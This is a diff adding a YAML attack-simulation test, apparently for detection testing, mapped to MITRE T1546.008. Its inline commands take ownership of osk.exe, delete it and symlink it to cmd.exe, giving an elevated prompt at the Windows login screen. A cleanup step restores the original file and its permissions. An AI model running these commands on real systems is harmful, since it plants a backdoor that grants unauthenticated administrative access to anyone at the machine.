@@ -1,0 +1,37 @@
+api_version: "2.0"
+name: Create Symbolic Link From osk.exe to cmd.exe
+description: |
+    Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.
+uuid: 51ef369c-5e87-4f33-88cd-6d61be63edf2
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1546: Event Triggered Execution'
+    subtechniques:
+        - 'T1546.008: Accessibility Features'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: create-symbolic-link-from-osk.exe-to-cmd.exe
+      inline: |
+        IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd )
+        takeown /F %windir%\System32\osk.exe /A
+        icacls %windir%\System32\osk.exe /grant Administrators:F /t
+        del %windir%\System32\osk.exe
+        mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe
+      executor: command_prompt
+      cleanup:
+        inline: |
+            takeown /F %windir%\System32\osk.exe /A
+            icacls %windir%\System32\osk.exe /grant Administrators:F /t
+            del %windir%\System32\osk.exe
+            copy /Y %windir%\System32\osk.exe.bak %windir%\System32\osk.exe
+            icacls %windir%\system32\osk.exe /inheritance:d
+            icacls %windir%\system32\osk.exe /setowner "NT SERVICE\TrustedInstaller"
+            icacls %windir%\System32\osk.exe /grant "NT SERVICE\TrustedInstaller":F /t
+            icacls %windir%\system32\osk.exe /grant:r SYSTEM:RX
+            icacls %windir%\system32\osk.exe /grant:r Administrators:RX
+        executor: command_prompt
